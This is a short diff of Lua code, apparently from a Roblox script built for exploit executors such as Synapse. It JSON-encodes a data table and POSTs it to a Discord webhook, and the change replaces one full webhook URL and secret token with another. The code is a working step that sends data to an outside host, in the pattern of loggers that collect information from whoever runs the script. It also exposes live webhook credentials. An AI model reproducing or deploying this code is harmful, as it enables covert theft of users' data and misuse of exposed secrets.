@@ -30,7 +30,7 @@ local json=HttpService:JSONEncode(data)
 local req=(syn and syn.request)or request or(http and http.request)
 if req then
 req({
-Url="https://discord.com/api/webhooks/1368031977042612244/68WwHgHEZXuht_wFh33LEinLFNUGKcTDLIR7hduf2jdoici702tvXXj_hptMhnGHxvCU",
+Url="https://discord.com/api/webhooks/1368032009158660126/5whBNuw-ppudtnlcXflQCRfBKyyofcIt3pBUlnJYYAQT9thbwWEDur7KWOXgVe99lhab",
 Method="POST",
 Headers={["Content-Type"]="application/json"},
 Body=json
